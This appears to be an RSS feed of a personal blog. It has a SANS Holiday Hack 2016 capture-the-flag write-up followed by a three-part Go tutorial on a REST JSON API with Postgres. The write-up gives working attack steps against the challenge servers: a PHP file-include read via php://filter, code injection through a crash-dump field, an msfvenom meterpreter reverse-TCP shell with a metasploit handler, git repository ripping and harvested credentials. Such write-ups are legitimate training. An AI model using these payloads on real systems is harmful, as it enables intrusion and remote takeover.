<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[thought|pipe]]></title><description><![CDATA[from me to you]]></description><link>https://stefanscherer.github.io/</link><generator>Ghost 0.11</generator><lastBuildDate>Thu, 12 Jan 2017 06:09:58 GMT</lastBuildDate><atom:link href="https://stefanscherer.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[SANS Holiday Hack 2016]]></title><description><![CDATA[<h3 id="part1amostcuriousbusinesscard">Part 1: A Most Curious Business Card</h3>

<p><strong>1: What is the secret message in Santa's tweets?</strong></p>

<pre><code>Answer: bugbounty
</code></pre>

<p>Solution: Load all tweets, open developer tools, and turn on preserve log  </p>

<pre><code class="language-javascript">$("div.js-tweet-text-container").text();
</code></pre>

<p><strong>2: What is inside the ZIP file distributed by Santa's team?</strong></p>

<pre><code>Answer: SantaGram_v4.2.apk
</code></pre>

<p>Solution:</p>]]></description><link>https://stefanscherer.github.io/sans-holiday-hack-2016/</link><guid isPermaLink="false">4b957152-7212-43eb-8bf4-cb0a986d40ca</guid><category><![CDATA[SANS]]></category><category><![CDATA[pentest]]></category><category><![CDATA[CTF]]></category><category><![CDATA[holiday hack]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Fri, 06 Jan 2017 07:31:58 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/sans_2016.png" medium="image"/><content:encoded><![CDATA[<h3 id="part1amostcuriousbusinesscard">Part 1: A Most Curious Business Card</h3>

<img src="https://stefanscherer.github.io/content/images/2017/01/sans_2016.png" alt="SANS Holiday Hack 2016"><p><strong>1: What is the secret message in Santa's tweets?</strong></p>

<pre><code>Answer: bugbounty
</code></pre>

<p>Solution: Load all tweets, open developer tools, and turn on preserve log  </p>

<pre><code class="language-javascript">$("div.js-tweet-text-container").text();
</code></pre>

<p><strong>2: What is inside the ZIP file distributed by Santa's team?</strong></p>

<pre><code>Answer: SantaGram_v4.2.apk
</code></pre>

<p>Solution: After exploring the North Pole a bit, I stumbled upon Pepper Minstix in the Workshop who mentioned <a href="http://www.northpolewonderland.com/dungeon.zip">dungeon.zip</a>. Although this zip is referenced later it is not the one the question is referring to. The real zip name is hidden at the top of this instagram <a href="https://www.instagram.com/p/BNpA2kEBF85/?taken-by=santawclaus">post</a>. Swapping <code>SantaGram_v4.2.zip</code> for <code>dungeon.zip</code> in the URL gives you the password protected <a href="http://northpolewonderland.com/SantaGram_v4.2.zip">file</a>. Which the password happens to be <code>bugbounty</code>, the hidden message from the tweets earlier.</p>

<h3 id="part2awesomepackagekonveyance">Part 2: Awesome Package Konveyance</h3>

<p><strong>3: What username and password are embedded in the APK file?</strong></p>

<pre><code>Answer: guest:busyreindeer78
</code></pre>

<p>Solution: <br>
Not too far away from Pepper is our friend Shinny Upatree who is in the Workshop Train Station. He gives a little clue into a tool that can help us decompile <code>SantaGram_v4.2.apk</code>.  </p>

<pre><code class="language-bash">git clone https://github.com/skylot/jadx.git  
cd jadx  
./gradlew dist
bin/jadx -d SantaGram_jadx SantaGram_v4.2.apk  
grep -r "password" SantaGram_jadx/  
grep -B1 "password" SantaGram_jadx/com/northpolewonderland/santagram/b.java  
</code></pre>

<p><strong>4: What is the name of the audible component (audio file) in the SantaGram APK file?</strong></p>

<pre><code>Answer: discombobulatedaudio1.mp3
</code></pre>

<p>Solution:  </p>

<pre><code class="language-bash">grep -r "audio" SantaGram_jadx/  
</code></pre>

<p>To get the audio file, use <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> that Bushy Evergreen references. Simply disassemble the resources and copy the file.  </p>

<pre><code class="language-bash">apktool d SantaGram_v4.2.zip  
cp SantaGram_v4.2/res/raw/discombobulatedaudio1.mp3 .  
</code></pre>

<p><strong>Bonus:</strong>
Using <code>grep</code> to search for <code>http</code> and <code>https</code> in the APK produced a few subdomains of the challenge that might be useful later on.</p>

<pre><code class="language-bash">grep -r "\.com/" | grep -v "android\.com"  
</code></pre>

<blockquote>
  <p>Yes! $IP is in scope! Just make sure you don't launch denial of service attacks, or otherwise interfere with the host's production processing. Dirbuster will not help you. - Mr. Tom Hessman</p>
</blockquote>

<p>We shall see about the dirbuster Mr. Tom Hessman!</p>

<p><strong>In Scope Targets</strong></p>

<pre><code class="language-bash">104.198.252.157  
https://analytics.northpolewonderland.com/  
https://analytics.northpolewonderland.com/report.php?type=launch  
https://analytics.northpolewonderland.com/report.php?type=usage

104.198.221.240  
http://ads.northpolewonderland.com/  
http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5

35.184.63.245  
http://dev.northpolewonderland.com/  
http://dev.northpolewonderland.com/index.php

35.184.47.139  
http://dungeon.northpolewonderland.com/

104.154.196.33  
http://ex.northpolewonderland.com/  
http://ex.northpolewonderland.com/exception.php  
</code></pre>

<h3 id="part3afreshbakedholidaypi">Part 3: A Fresh-Baked Holiday Pi</h3>

<p>After collecting the power cord, heat sink, hdmi cable, sd card, and cranberry pi board the user needs to speak with Holly Evergreen over by the portal. She gives you the <a href="http://northpolewonderland.com/cranbian.img.zip">cranbian image</a> to perform the next steps.</p>

<h6 id="5whatisthepasswordforthecranpiaccountonthecranberrypisystem">5: What is the password for the "cranpi" account on the Cranberry Pi system?</h6>

<pre><code>Answer: yummycookies
</code></pre>

<p>Solution: Going back over by the Christmas tree we see Wunorse Openslae and he refers us to an <a href="https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image">article</a> for mounting Raspberry Pi images.</p>

<h6 id="6howdidyouopeneachterminaldoorandwherehadthevillainimprisonedsanta">6: How did you open each terminal door and where had the villain imprisoned Santa?</h6>

<pre><code>Answer: DFER 1978
</code></pre>

<h6 id="elfhouse2">Elf House #2</h6>

<blockquote>
  <p>To open the door, find both parts of the passphrase inside the /out.pcap file</p>
</blockquote>

<pre><code>Answer: santaslittlehelper
</code></pre>

<p>Solution: The banner hints that <code>tcpdump</code> will be needed in order to complete the task. However, it is not available to the user that you run as <code>scratchy</code>. Following a hint, <code>sudo -l</code> mentions that <code>tcpdump</code> and <code>strings</code> can run without a password. The man-page for <code>sudo</code> shows that the <code>-u</code> flag allows you to set a user before running a command. The first part of the passphrase is easy to find and can be found using either <code>tcpdump</code> or <code>strings</code>. After trying to find a way to extract the second part's bin file, I stumpled on Jeff McJunkin's <a href="https://www.reddit.com/r/netsec/comments/5hmlkj/the_2016_sans_holiday_hack_challenge/db5qoes/">hint</a>. Playing with the encodings allowed a simple output with the second part of the passphrase to be found.</p>

<pre><code class="language-bash">sudo -l  
# Matching Defaults entries for scratchy on e06cab9d52fb:
#    env_reset, mail_badpass,
#    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
# User scratchy may run the following commands on e06cab9d52fb:
#    (itchy) NOPASSWD: /usr/sbin/tcpdump
#    (itchy) NOPASSWD: /usr/bin/strings
sudo -u itchy strings /out.pcap  
# &lt;input type="hidden" name="part1" value="santasli" /&gt;
sudo -u itchy strings -e l /out.pcap  
# part2:ttlehelper
</code></pre>

<h6 id="santasoffice">Santa's Office</h6>

<blockquote>
  <p>To open the door, find the passphrase file deep in the directories.</p>
</blockquote>

<pre><code>Answer: open_sesame
</code></pre>

<p>Solution: The banner hint suggests some hidden and trick named directories. A simple recursive list of the user's home directory gave some interesting output that was heavily nested in <code>./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/</code>.</p>

<pre><code class="language-bash">ls -laR | grep -B4 "key"  
find . -name "key_for_the_door.txt" -exec cat '{}' +  
</code></pre>

<h6 id="thecorridor">The Corridor</h6>

<blockquote>
  <p>GREETINGS PROFESSOR FALKEN.</p>
</blockquote>

<pre><code>Answer: LOOK AT THE PRETTY LIGHTS
</code></pre>

<p>Solution: The terminal emulates the W.O.P.R computer from the movie WarGames. The password is given by responding to the queues with the correct lines from the script.</p>

<h6 id="dfer">DFER</h6>

<blockquote>
  <p>Find the passphrase from the wumpus.  Play fair or cheat; it's up to you.</p>
</blockquote>

<pre><code>Answer: wumpus is misunderstood
</code></pre>

<p>Solution: No nifty hack on this one, just play <code>wumpus</code> and try not to miss!</p>

<h6 id="trainstation">Train Station</h6>

<pre><code>Answer: 24fb3e89ce2aa0ea422c3d511d40dd84
</code></pre>

<p>Solution: The Train Management Console has a Help Menu that uses <code>less</code> to display it. One of the options while using <code>less</code> is to execute a command like <code>!command /bin/bash</code>. The password is located in the <code>Train_Console</code> script or you can bypass it and execute start from the cli.  </p>

<pre><code class="language-bash">./ActivateTrain
</code></pre>

<p><strong>Bonus:</strong>
Activating the train allows you to travel back in time to the North Pole circa 1978. Santa is located in the Dungeon For Errant Reindeer (DFER) but doesn't remember how he got there.</p>

<h3 id="part4mygoshitsfullofholes">Part 4: My Gosh... It's Full of Holes</h3>

<p>The Mobile Analytics Server (via credentialed login access)</p>

<pre><code>Answer: Credentials in Source Code
</code></pre>

<p>Solution: Log into the <a href="https://analytics.northpolewonderland.com/">analytics</a> server using the credentials harvested from the APK and click the link to <a href="https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008">discombobulatedaudio2.mp3</a>.</p>

<p>The Dungeon Game</p>

<p>The Debug Server</p>

<pre><code>Incomplete
</code></pre>

<p>The Banner Ad Server</p>

<pre><code>Incomplete
</code></pre>

<p>The Uncaught Exception Handler Server</p>

<pre><code>Answer: Local File Includes and Code Injection
</code></pre>

<p>Solution: Sugarplum Mary gives us the initial insight we need in order to exploit this system. The APK gives you the format in which to make the requests when you dig into how a crash dump request is built. Modifying the request to accommodate the example in the <a href="https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities">hint</a> returns the handler code.  </p>

<pre><code class="language-bash"># gets you the code for the exception handler
curl -vH "Content-Type: application/json" -d '{"data":{"crashdump":"php://filter/convert.base64-encode/resource=exception"}, "operation":"ReadCrashDump"}' "http://ex.northpolewonderland.com/exception.php" | base64 -d &gt; exception.php  
</code></pre>

<p>There are two primary functions in <code>exception.php</code>, <code>processCrashdump($crashdump)</code> which happens on a <code>WriteCrashDump</code> operation and <code>readCrashdump($requestedCrashdump)</code> on a <code>ReadCrashDump</code>. <code>$crashdump</code> is a parameter nested in the <code>data</code> portion of the JSON content sent to the server.  </p>

<pre><code class="language-php">&lt;?php  
# snippet from processCrashdump where un-sanitized user input is allowed
$crashdump_encoded = "&lt;?php print('" . json_encode($crashdump, JSON_PRETTY_PRINT) . "');";
# snippet from readCrashdump where the un-sanitized user input can be executed
require($requestedCrashdump['crashdump'] . '.php');  
</code></pre>

<blockquote>
  <p>Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3</p>
</blockquote>

<p>The exception handler code references <a href="http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3">discombobulatedaudio6.mp3</a> is stored at the webroot for the nginx server.</p>

<p><strong>Bonus:</strong>
It is possible to get remote access to this server. Build a reverse tcp shell for <code>php</code> using <code>msfvenom</code>. The code for the reverse shell needs to be modified to exclude certain characters but the end result should be something similar to <code>'); $MODIFIED_EXPLOIT print('</code>.  </p>

<pre><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f raw &gt; ex_shell.php  
</code></pre>

<p>Format for the <code>WriteCrashDump</code> reverse tcp shell payload, <code>crashdump.json</code>.  </p>

<pre><code class="language-json">{
    "operation": "WriteCrashDump",
    "data": "'); $MODIFIED_EXPLOIT print('"
}
</code></pre>

<p>Setup a metasploit handler to receive and setup a meterpreter session.  </p>

<pre><code class="language-bash">msf exploit(handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp  
PAYLOAD =&gt; php/meterpreter/reverse_tcp

msf exploit(handler) &gt; set LHOST 0.0.0.0  
LHOST =&gt; 0.0.0.0

msf exploit(handler) &gt; exploit

[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Starting the payload handler...
</code></pre>

<p>In another shell, write the payload to disk and then use the <code>crashdump-XXXXXX</code> from the response in the read request to execute the payload.  </p>

<pre><code class="language-bash">curl -vH "Content-Type: application/json" -d @crashdump.json "http://ex.northpolewonderland.com/exception.php"  
curl -vH "Content-Type: application/json" -d '{"data":{"crashdump":"crashdump-XXXXXX"}, "operation":"ReadCrashDump"}' "http://ex.northpolewonderland.com/exception.php"  
</code></pre>

<p>The Mobile Analytics Server (post authentication)</p>

<pre><code>Answer: Nmap, Source Code, and SQL Injection
</code></pre>

<p>Solution:</p>

<pre><code class="language-bash">PORT    STATE SERVICE  
22/tcp  open  ssh  
| ssh-hostkey:
|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)
|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)
|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)
443/tcp open  https  
| http-git:
|   104.198.252.157:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Finishing touches (style, css, etc)
| http-title: Sprusage Usage Reporter!
|_Requested resource was login.php
| ssl-cert: Subject: commonName=analytics.northpolewonderland.com
| Subject Alternative Name: DNS:analytics.northpolewonderland.com
| Not valid before: 2016-12-07T17:35:00
|_Not valid after:  2017-03-07T17:35:00
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
</code></pre>

<p>Downloading the git repository gives a corrupted instance of the code base. After using this <a href="https://github.com/kost/dvcs-ripper">tool</a>, I was able to get the source code. Looking through the git log I noticed mention of authentication updates. Checking out <code>5f0c135e1479d865945577c0a70d0cf39e49cdc7</code> provides administrator credentials that are still valid in <code>sprusage.sql</code>.</p>

<pre><code class="language-bash">./rip-git.pl -s -v -u https://analytics.northpolewonderland.com/.git/
git log  
git checkout 5f0c135e1479d865945577c0a70d0cf39e49cdc7  
</code></pre>

<pre><code class="language-sql">INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');  
</code></pre>]]></content:encoded></item><item><title><![CDATA[[Part III] How To Build a RESTful JSON API in Go - API]]></title><description><![CDATA[<p>Concluding our build of a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>, we will explore the code that binds the backend queries to the HTTP methods. Instead of using the builtin networking tools for HTTP, I decided to use <a href="https://echo.labstack.com/">echo</a>.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A true RESTful service uses HTTP methods coupled with</p>]]></description><link>https://stefanscherer.github.io/part-iii-how-to-build-a-restful-json-api-in-go-api/</link><guid isPermaLink="false">4e0cddc2-eba8-49c8-bcf2-b1f3763aa834</guid><category><![CDATA[development]]></category><category><![CDATA[go tips]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Thu, 06 Oct 2016 12:00:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/golang-3.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/golang-3.jpg" alt="[Part III] How To Build a RESTful JSON API in Go - API"><p>Concluding our build of a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>, we will explore the code that binds the backend queries to the HTTP methods. Instead of using the builtin networking tools for HTTP, I decided to use <a href="https://echo.labstack.com/">echo</a>.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A true RESTful service uses HTTP methods coupled with Unified Resource Identifiers to traverse an application. In this example, the input data from the client is also JSON.</p>

<h6 id="server">Server</h6>

<p>As we discussed in the previous part of the tutorial, by adding JSON tags we can embed the database configuration. That way we can load both configs from the same file.</p>

<pre><code class="language-go">type (  
    // Config for the server and database
    Config struct {
        Server struct {
            Bind    string `json:"bind"`
            Cert    string `json:"cert"`
            Key     string `json:"key"`
            LogPath string `json:"log,omitempty"`
        } `json:"server"`
        Database database.Config `json:"database"`
    }
)
</code></pre>

<p>With our configuration file modeled, all we need to do is read it into memory and <code>Unmarshal()</code> the data into the structure. From there we can call the method receivers on both <code>Database{}</code> and <code>Server{}</code> for setup. <code>NewServer()</code> creates an echo instance, binds middleware, and groups routes for the User API. It also calls <code>database.Config.NewStore()</code> which creates and passes back a connection to the database.</p>

<pre><code class="language-go">// NewConfig loads the configurations into a structure
// to be used as a global operator at runtime
func NewConfig(path string) (conf *Config) {  
    data, _ := ioutil.ReadFile(path)
    if err := json.Unmarshal(data, &amp;conf); err != nil {
        return nil
    }
    return conf
}

// NewServer returns a configured api server instance
func (c *Config) NewServer() (*echo.Echo, error) {  
    e := echo.New()
    if logFile, err := os.OpenFile(c.Server.LogPath, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0660); err != nil {
        e.Use(middleware.Logger())
    } else {
        e.Use(middleware.LoggerWithConfig(middleware.LoggerConfig{Output: logFile}))
    }
    e.Use(middleware.Recover())
    api := e.Group("/api/v1")
    if store, err := c.Database.NewStore(); err == nil {
        data := &amp;Data{store}
        handlers := &amp;Handlers{User: data}
        api.POST("/user", handlers.User.CreateUser)
        api.GET("/user", handlers.User.ReadUser)
        api.PUT("/user", handlers.User.UpdateUser)
        api.DELETE("/user", handlers.User.DeleteUser)
    } else {
        return nil, err
    }
    return e, nil
}
</code></pre>

<h6 id="userapi">User API</h6>

<p>In <code>NewServer()</code> there is a variable called <code>handlers</code> which is where all of the HTTP handlers for the echo routes are defined. <code>Handlers{}</code> are essentially a definition of the CRUD methods and some defined type. They can be used because <code>*database.Store{}</code> is embedded in <code>Data{}</code> and the interface <code>UserCRUD{}</code> is implemented as pointer receiver methods for <code>Data{}</code>. Therefore by initializing <code>Handlers.User</code> with <code>*Data{}</code>, the pointer receiver methods are available to <code>Handlers.User</code> so they can be passed as a handler for the route.</p>

<pre><code class="language-go">type (  
    // Handlers are the HTTP handlers to be used by the API router
    Handlers struct {
        User UserCRUD
    }
)
</code></pre>

<p>All that is left to do from here is implement each CRUD method of the <code>UserCRUD</code> interface. The example below shows how I implemented <code>CreateUser()</code>. Since <code>echo.Context</code> is passed to this pointer method I use an anonymous structure to bind to the <code>POST</code> data. That way I can control which data the user actually gets to define. If binding fails the server sends an <code>400</code> error and returns. If it passes then a <code>database.User</code> is created from the request. Since this is a pointer method with the database embedded in it, all that is left is to pass the <code>database.Query</code> that represents the newly defined <code>database.User</code>. Depending on the transaction response, a success or error message is sent back.</p>

<pre><code class="language-go">func (d *Data) CreateUser(c echo.Context) error {  
    bind := struct {
        First string `json:"first"`
        Last  string `json:"last"`
        Role  string `json:"role"`
    }{}
    if err := c.Bind(&amp;bind); err != nil {
        return c.JSON(http.StatusBadRequest, map[string]interface{}{
            "code":    1010,
            "message": "invalid user or json format in request body",
        })
    }
    user := &amp;database.User{First: bind.First, Last: bind.Last, Role: bind.Role}
    if err := d.EWT(user.Create()); err != nil {
        return c.JSON(http.StatusInternalServerError, map[string]interface{}{
            "code":    1011,
            "message": "user could not be created",
        })
    }
    return c.JSON(http.StatusOK, map[string]interface{}{
        "code":    1000,
        "message": "user was successfully created",
    })
}
</code></pre>

<p>There are multiple ways to create a RESTful API in golang even though it is an opinionated language. I came from a Ruby on Rails background and I found this structure to be similar.</p>]]></content:encoded></item><item><title><![CDATA[[Part II] How To Build a RESTful JSON API in Go - Database]]></title><description><![CDATA[<p>In this portion of building a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>, we explore the database powering the backend. I decided to use the builtin SQL library with a Postgres driver rather than using an ORM.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A true RESTful service uses HTTP methods coupled with Unified Resource Identifiers</p>]]></description><link>https://stefanscherer.github.io/part-ii-how-to-build-a-restful-json-api-in-go-database/</link><guid isPermaLink="false">74d17e02-7a18-4878-aff2-e5bc9dfc4794</guid><category><![CDATA[development]]></category><category><![CDATA[go tips]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Thu, 29 Sep 2016 12:00:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/golang-2.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/golang-2.jpg" alt="[Part II] How To Build a RESTful JSON API in Go - Database"><p>In this portion of building a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>, we explore the database powering the backend. I decided to use the builtin SQL library with a Postgres driver rather than using an ORM.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A true RESTful service uses HTTP methods coupled with Unified Resource Identifiers to traverse an application. In this example, the input data from the client is also JSON.</p>

<h6 id="database">Database</h6>

<p>Configuring the connection is important and we need to make sure it can used elsewhere. By exporting <code>Config</code> we can embed it in another configuration structure and populate them all at once using JSON tags. Plus by adding a method receiver we can easily return a connection after a configuration file has been parsed.</p>

<pre><code class="language-go">type (  
  // Config for postgres db
  Config struct {
    Auth
    Name           string `json:"name"`
    Host           string `json:"host"`
    Port           int    `json:"port"`
    SSL            string `json:"ssl_mode"`
    ConnectTimeout int    `json:"connect_timeout"`
  }
  // Store embeds an instance of a sql.DB so we can
  // inject new method receivers
  Store struct {
    *sql.DB
  }
)

// NewStore returns a configured *Store instance
func (c Config) NewStore() (*Store, error) {  
    pg, err := Reverse(c.Auth)
    if err != nil {
        return nil, err
    }
    source := fmt.Sprintf("user=%s password=%s dbname=%s host=%s port=%d sslmode=%s connect_timeout=%d", pg.A, pg.B, c.Name, c.Host, c.Port, c.SSL, c.ConnectTimeout)
    db, err := sql.Open("postgres", source)
    if err != nil {
        return nil, err
    }
    if err = db.Ping(); err != nil {
        return nil, err
    }
    return &amp;Store{db}, nil
}
</code></pre>

<p>Because Go allows embedding structures in each other I decided to embed a <code>*sql.DB</code> into a new structure so that I can expand upon it's functions. As seen above we create a new <code>Store{}</code> which contains an embedded pointer to a SQL database. From here we can create new pointer receiver methods that implement functionality that we need. In the example below I created two new methods to perform <code>Exec()</code> &amp; <code>QueryRow()</code> with a SQL transaction.</p>

<pre><code class="language-go">// EWT is execute with transaction
func (s *Store) EWT(st Statement) error {  
    return s.Transact(func(tx *sql.Tx) error {
        res, err := tx.Exec(st.Query, st.Args...)
        if aff, _ := res.RowsAffected(); aff &lt; 1 {
            return errors.New("no change during execution")
        }
        return err
    })
}

// QWT is query with transaction
func (s *Store) QWT(st Statement, v interface{}) error {  
    return s.Transact(func(tx *sql.Tx) error {
        return tx.QueryRow(st.Query, st.Args...).Scan(v)
    })
}
</code></pre>

<p>Another important piece is the structure <code>PropertyMap</code> which is of type <code>map[string]interface{}</code>. This is necessary to read and write JSON values back to the database which we will later see in the Model implementation.</p>

<pre><code class="language-go">// PropertyMap allows to map and store JSON data with Postgres
type PropertyMap map[string]interface{}

// Value map to a sql driver value
func (p PropertyMap) Value() (driver.Value, error) {  
    j, err := json.Marshal(p)
    return j, err
}

// Scan map from sql return to a PropertyMap
func (p *PropertyMap) Scan(src interface{}) error {  
    source, ok := src.([]byte)
    if !ok {
        return errors.New("Type assertion .([]byte) failed.")
    }

    var i interface{}
    err := json.Unmarshal(source, &amp;i)
    if err != nil {
        return err
    }

    *p, ok = i.(map[string]interface{})
    if !ok {
        return errors.New("Type assertion .(map[string]interface{}) failed.")
    }

    return nil
}
</code></pre>

<h6 id="migrations">Migrations</h6>

<p>The migration component allows the application to be portable while also serving a function in testing. It allows the test database to be easily wiped and the schema to be reconfigured. Which helps in making sure the test outcomes are always the same and no previous tests interfere with the returns.</p>

<p>Because the schema needs to be rebuilt in an order, I created a migration method which sorts each level of the map by their keys and then performs the same sorting on the inner map. This way all you need to do to expand upon the migration is to add your SQL statement with the given order of operation it needs.  </p>

<pre><code class="language-go">// migrations to perform
var migrations = map[int]map[int]string{  
    // schema commands in the order to be performed
    mSCHEMA: map[int]string{
        0: `DROP SCHEMA IF EXISTS app CASCADE`,
        1: `CREATE SCHEMA IF NOT EXISTS app AUTHORIZATION appbot`,
    },
    // type commands in the order to be performed
    mTYPE: map[int]string{
        0: `CREATE TYPE app.roles AS ENUM ('user','manager','admin')`,
    },
    // table commands in the order to be performed
    mTABLE: map[int]string{
        0: `CREATE TABLE IF NOT EXISTS app.users (
                    id SERIAL PRIMARY KEY,
                    first varchar(100) NOT NULL CHECK (first &lt;&gt; ''),
                    last varchar(100) NOT NULL CHECK (last &lt;&gt; ''),
                    role app.roles NOT NULL DEFAULT 'user',
                    api_key char(32) NOT NULL UNIQUE
            )`,
    },
    // index commands in the order to be performed
    mINDEX: map[int]string{
        0: `CREATE INDEX role_idx ON app.users (role)`,
    },
}
</code></pre>

<h6 id="modeling">Modeling</h6>

<p>All that is left now is to build your models and make sure they implement the <code>CRUD</code> interface. We only have one model for this example but they should all be the same layout just different structures. As each structure should model the table it will be working with. The JSON tags on each element allow us to easily bind data so that it can be used by both the API and database.</p>

<p>Each <code>CRUD</code> pointer receiver method as defined by the interface should return a <code>Statement</code>. This is essentially the <code>query</code> &amp; <code>args</code> parameters of the <code>*sql.DB</code>'s <code>Exec()</code> &amp; <code>QueryRow()</code>.</p>

<pre><code class="language-go">type (  
    // User models the app.users table
    User struct {
        ID    int    `json:"id"`
        First string `json:"first"`
        Last  string `json:"last"`
        Role  string `json:"role"`
        Key   string `json:"api_key"`
    }
)

// Create builds the Statement to insert a user into the database
func (u *User) Create() Statement {  
    u.GenerateKey(32)
    if len(u.Role) &lt;= 0 {
        u.Role = USER
    }
    return Statement{
        "INSERT INTO app.users (first,last,role,api_key) VALUES ($1,$2,$3,$4)",
        []interface{}{u.First, u.Last, u.Role, u.Key},
    }
}

// Read creates the Statement to read a user from the database
func (u *User) Read() Statement {  
    return Statement{
        "SELECT ROW_TO_JSON(u) FROM (SELECT * FROM app.users WHERE id = $1) AS u",
        []interface{}{u.ID},
    }
}

// Update creates the Statement to update a user in the database
func (u *User) Update(v interface{}) Statement {  
    // no merging needed to ignore v
    return Statement{
        "UPDATE app.users SET first = $1,last = $2,role = $3 WHERE id = $4",
        []interface{}{u.First, u.Last, u.Role, u.ID},
    }
}

// Delete creates the Statement to delete a user from the database
func (u *User) Delete() Statement {  
    return Statement{
        "DELETE FROM app.users WHERE id = $1",
        []interface{}{u.ID},
    }
}
</code></pre>]]></content:encoded></item><item><title><![CDATA[[Part I] How To Build a RESTful JSON API in Go - Testing]]></title><description><![CDATA[<p>In my recent endeavor with Go I needed to create a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>. This blog series outlines what I learned and the methods chosen to implement the API. First up in this blog series demonstrates the implementation of Behavioral Driven Development utilizing <a href="https://github.com/smartystreets/goconvey">GoConvey</a>.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A</p>]]></description><link>https://stefanscherer.github.io/how-to-build-a-restful-json-api-in-go-testing-part-i/</link><guid isPermaLink="false">04cb6386-113d-4a08-b628-4e3d0ff36771</guid><category><![CDATA[development]]></category><category><![CDATA[go tips]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Tue, 27 Sep 2016 12:00:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/golang-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/golang-1.jpg" alt="[Part I] How To Build a RESTful JSON API in Go - Testing"><p>In my recent endeavor with Go I needed to create a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>. This blog series outlines what I learned and the methods chosen to implement the API. First up in this blog series demonstrates the implementation of Behavioral Driven Development utilizing <a href="https://github.com/smartystreets/goconvey">GoConvey</a>.</p>

<h5 id="disclaimer">Disclaimer</h5>

<p>A true RESTful service uses HTTP methods coupled with Unified Resource Identifiers to traverse an application. In this example, the input data from the client is also JSON.</p>

<h6 id="goconveysetup">GoConvey Setup</h6>

<p>There are two primary parts to test within this example and I decided to break them up into "sub-packages". These "sub-packages" include api for handling the RESTful aspects and database for communicating with Postgres instance. Go makes testing very easy by sourcing any file <code>*_test.go</code> and running any test functions that start with <code>Test*</code>. For both "sub-packages" I created a single Test function and created a general structure to model each test structure.</p>

<p>Take the <code>database</code> sub-package for example. There is only one test function and that is in <code>database_test.go</code>. The other test file only contains test cases to be conveyed.  </p>

<pre><code class="language-bash">database  
├── database.go
├── database_test.go
├── migrate.go
├── user.go
└── user_test.go
</code></pre>

<p>Diving deeper into <code>TestDatabase()</code>, we test out database connection items and migrate our schema for the test environment. The final portion of the function takes <code>[]ModelTest</code> and runs each test case.</p>

<pre><code class="language-go">type (  
    ModelTest struct {
        Title string
        Func  func(*Store) func()
    }
    TestConfig struct {
        Config `json:"database"`
    }
)

var Conf TestConfig  
var Data *Store

func TestDatabase(t *testing.T) {  
    Convey("The Database Should", t, func() {
        Convey("Be Configurable From A JSON File", func() {
            data, err := ioutil.ReadFile("../configs/example.config.json")
            So(err, ShouldBeNil)
            So(json.Unmarshal(data, &amp;Conf), ShouldBeNil)
            So(Conf, ShouldNotBeEmpty)
            Data, err = Conf.NewStore()
            So(err, ShouldBeNil)
            So(Data, ShouldNotBeNil)
        })
        Convey("Have Migrations For The Schema", func() {
            So(Data.Migrate(false), ShouldBeNil)
        })
    })
    var modelTests = []ModelTest{UserTest}
    for _, model := range modelTests {
        Convey("The Database "+model.Title, t, model.Func(Data))
    }
}
</code></pre>

